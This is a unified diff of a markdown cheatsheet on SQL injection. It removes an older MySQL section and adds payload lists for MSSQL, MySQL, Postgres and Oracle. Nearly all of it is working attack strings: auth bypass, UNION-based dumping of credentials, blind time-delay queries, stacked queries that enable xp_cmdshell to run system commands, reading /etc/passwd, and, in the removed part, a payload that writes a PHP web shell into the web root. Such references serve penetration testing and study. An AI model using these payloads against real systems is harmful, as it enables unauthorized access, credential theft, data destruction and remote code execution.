@@ -3,82 +3,198 @@ layout: post
 category: cheatsheets
 ---
 
-### Table of Contents
+## Key Delimiters and Enclosures
+- `'`, `"`: Standard string delimiters. E.g., `' OR '1'='1`
+- `\``: MySQL identifier quoting. E.g., `` `column` = 'value' ``
+- `;`: Statement separator. E.g., `SELECT * FROM users; DROP TABLE users;`
+- `--`, `/*...*/`: SQL comments. E.g., `--comment`, `/* comment */`
 
-- [MySQL](#mysql)
-    - [General Commands](#general-commands)
-    - [Mysql Operator Precedence](#mysql-operator-precedence)
-    - [SQL Injection](#sql-injection)
+## Injection Patterns
+- Basic Injection: `' OR 1=1--`
+- Closing Brackets: Try closing out functions or statements. E.g., `')`, `'))`, `')))--`, `%'))-- -`
+- Logical Operators: `OR`, `AND`. E.g., `' OR 'x'='x`
+- Union Injection: `' UNION SELECT ... --`
+- Conditional Time Delays (for blind SQLi): 
+  - MySQL: `'; SELECT SLEEP(5);--`
+  - MSSQL: `'; WAITFOR DELAY '00:00:05';--`
+  - Oracle: `'; dbms_lock.sleep(5);--`
+  - PostgreSQL: `'; SELECT pg_sleep(5);--`
+- Out-of-Band: Through DNS or HTTP. E.g., DNS lookup triggered by SQL query.
+
+## Testing Methodology
+1. **Find Injection Points**: Identify user inputs/parameters interacting with the database.
+2. **Manipulate Inputs**: Use delimiters, enclosures, and patterns to alter queries.
+3. **Observe Behavior**: Changes or errors can indicate SQLi vulnerabilities.
+4. **Automate Detection**: Tools like SQLMap or OWASP ZAP can assist in finding vulnerabilities
 
 
-## MySQL
+### MSSQL
 
-## General Commands
+#### List databases:
+- Normal
+    - `Select name from sys.databases`
+- Error based
+    - `cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)`
+- Union Based
+    - `' UNION SELECT name, NULL FROM master..sysdatabases --`
+- Stacked Queries:
+    - `; SELECT name FROM master..sysdatabases; --`
 
-| **Command**   | **Description**   |
-| --------------|-------------------|
-| ```mysql -u root -h server -P 3306 -p``` | login to mysql database |
-| ```SHOW DATABASES``` | List available databases |
-| ```USE users``` | Switch to database |
-| **Tables** |
-| ```CREATE TABLE logins (id INT, ...)``` | Add a new table |
-| ```SHOW TABLES``` | List available tables in current database |
-| ```DESCRIBE logins``` | Show table properties and columns |
-| ```INSERT INTO table_name VALUES (value_1,..)``` | Add values to table |
-| ```INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)``` | Add values to specific columns in a table |
-| ```UPDATE table_name SET column1=newvalue1, ... WHERE <condition>``` | Update table values |
-| **Columns** |
-| ```SELECT * FROM table_name``` | Show all columns in a table |
-| ```SELECT column1, column2 FROM table_name``` | Show specific columns in a table |
-| ```DROP TABLE logins``` | Delete a table |
-| ```ALTER TABLE logins ADD newColumn INT``` | Add new column |
-| ```ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn``` | Rename column |
-| ```ALTER TABLE logins MODIFY oldColumn DATE``` | Change column datatype |
-| ```ALTER TABLE logins DROP oldColumn``` | Delete column |
-| **Output** |
-| ```SELECT * FROM logins ORDER BY column_1``` | Sort by column |
-| ```SELECT * FROM logins ORDER BY column_1 DESC``` | Sort by column in descending order |
-| ```SELECT * FROM logins ORDER BY column_1 DESC, id ASC``` | Sort by two-columns |
-| ```SELECT * FROM logins LIMIT 2``` | Only show first two results |
-| ```SELECT * FROM logins LIMIT 1, 2``` | Only show first two results starting from index 2 |
-| ```SELECT * FROM table_name WHERE <condition>``` | List results that meet a condition |
-| ```SELECT * FROM logins WHERE username LIKE 'admin%'``` | List results where the name is similar to a given string |
 
-## MySQL Operator Precedence
-* Division (```/```), Multiplication (```*```), and Modulus (```%```)
-* Addition (```+```) and Subtraction (```-```)
-* Comparison (```=```, ```>```, ```<```, ```<=```, ```>=```, ```!=```, ```LIKE```)
-* NOT (```!```)
-* AND (```&&```)
-* OR (```||```)
+#### List Tables:
+- Normal
+    - `select * from app.information_schema.tables;`
+- Error based`
+    - `cast((SELECT TABLE_NAME FROM exercise.information_schema.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)`
+- Union Based
+    - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --`
+- Stacked Queries:
+    - `; SELECT * FROM information_schema.tables; --`
 
-## SQL Injection
+#### List columns:
+- Normal
+    - `select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';`
+- Error based
+    - `cast((SELECT+column_name+FROM+exercise.information_schema.columns+where+table_name+%3d+'secrets'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY)+as+integer)`
+- Union Based
+    - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'table_name' --`
+- Stacked Queries:
+    - `; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'table_name'; --`
 
-| **Payload** | **Description**   |
-| ------------|-------------------|
-| **Auth Bypass** |
-| ```admin' or '1'='1``` | Basic Auth Bypass |
-| ```admin')-- -``` | Basic Auth Bypass With comments |
-| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
-| **Union Injection** |
-| ```' order by 1-- -``` | Detect number of columns using ```order by``` |
-| ```cn' UNION select 2,2,3-- -``` | Detect number of columns using Union injection add a value everytime |
-| ```cn' UNION select 1,@@version,3,4-- -``` | Basic Union injection, Find where you can return data |
-| ```UNION select username, 2, 3, 4 from passwords-- -``` | Union injection for 4 columns |
-| **DB Enumeration** |
-| ```SELECT @@version``` | Fingerprint MySQL with query output |
-| ```SELECT SLEEP(5)``` | Fingerprint MySQL with no output |
-| ```cn' UNION select 1,database(),2,3-- -``` | Current database name |
-| ```cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -``` | List all databases |
-| ```cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -``` | List all tables in a specific database |
-| ```cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -``` | List all columns in a specific table |
-| ```cn' UNION select 1, username, password, 4 from dev.credentials-- -``` | Dump data from a table in another database |
-| **Privileges** |
-| ```cn' UNION SELECT 1, user(), 3, 4-- -``` | Find current user |
-| ```cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -``` | Find if user has admin privileges |
-| ```cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -``` | Find if all user privileges |
-| ```cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -``` | Find which directories can be accessed through MySQL |
-| **File Injection** |
-| ```cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -``` | Read local file |
-| ```select 'file written successfully!' into outfile '/var/www/html/proof.txt'``` | Write a string to a local file |
-| ```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -``` | Write a web shell into the base web directory |
+### Command Execution:
+- Normal
+    - To use `xp_cmdshell` for command execution, it first needs to be enabled by a user with administrative privileges:
+      ```sql
+      EXEC sp_configure 'show advanced options', 1;
+      RECONFIGURE;
+      EXEC sp_configure 'xp_cmdshell', 1;
+      RECONFIGURE;
+      ```
+    - After enabling, you can execute system commands like so:
+      ```sql
+      EXEC xp_cmdshell 'your_command_here';
+      ```
+- SQLi
+    - Just like before, you will need to enable the privs first, sometimes they may be enabled by default:
+        ```sql
+        '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- ```
+    - `'; EXEC xp_cmdshell 'your_command_here'; --`
+
+## MYSQL
+
+### List databases:
+- Normal
+    - `SHOW DATABASES;`
+- Error based
+    - `' AND (SELECT COUNT(*) FROM information_schema.schemata) -- `
+- Union Based
+    - `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`
+- Stacked Queries:
+    - `; SHOW DATABASES; --`
+
+### List Tables:
+- Normal
+    - `SHOW TABLES;`
+- Error based
+    - `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'database_name') --`
+- Union Based
+    - `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --`
+- Stacked Queries:
+    - `; SHOW TABLES; --`
+
+### List columns:
+- Normal
+    - `SHOW COLUMNS FROM table_name;`
+- Error based
+    - `' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
+- Union Based
+    - `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
+- Stacked Queries:
+    - `; SHOW COLUMNS FROM table_name; --`
+
+### Read Files:
+- Normal
+    - `SELECT LOAD_FILE('/path/to/file');`
+- SQLi
+    - `' UNION SELECT LOAD_FILE('/path/to/file'), NULL --`
+
+### Write Files:
+- Normal
+    - `SELECT * INTO OUTFILE '/path/to/file' FROM table_name;`
+- SQLi
+    - `' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --`
+
+
+## Postgres
+
+### List databases:
+- Normal
+    - `SELECT datname FROM pg_database;`
+- Error based
+    - `AND (SELECT COUNT(*) FROM pg_database) --`
+- Union Based
+    - `' UNION SELECT datname, NULL FROM pg_database --`
+- Stacked Queries:
+    - `; SELECT datname FROM pg_database; --`
+
+### List Tables:
+- Normal
+    - `SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';`
+- Error based
+    - `AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public') --`
+- Union Based
+    - `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --`
+- Stacked Queries:
+    - `; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --`
+
+### List columns:
+- Normal
+    - `SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';`
+- Error based
+    - `AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'table_name') --`
+- Union Based
+    - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --`
+- Stacked Queries:
+    - `; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --`
+
+### Read Files:
+- Normal
+    - `SELECT pg_read_file('/path/to/file', 0, 1000000);`
+- SQLi
+    - `' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --`
+
+### Write Files:
+- Normal
+    - `COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;`
+
+## ORACLE
+
+### List databases:
+- Normal
+    - `SELECT name FROM v$database;`
+- Error based
+    - `' AND (SELECT COUNT(*) FROM v$database) --`
+- Union Based
+    - `' UNION SELECT name, NULL FROM v$database --`
+- Stacked Queries:
+    - `; SELECT name FROM v$database; --`
+
+### List Tables:
+- Normal
+    - `SELECT table_name FROM all_tables;`
+- Error based
+    - `' AND (SELECT COUNT(*) FROM all_tables) --`
+- Union Based
+    - `' UNION SELECT table_name, NULL FROM all_tables --`
+- Stacked Queries:
+    - `; SELECT table_name FROM all_tables; --`
+
+### List columns:
+- Normal
+    - `SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';`
+- Error based
+    - `' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --`
+- Union Based
+    - `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --`
+- Stacked Queries:
+    - `; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --`
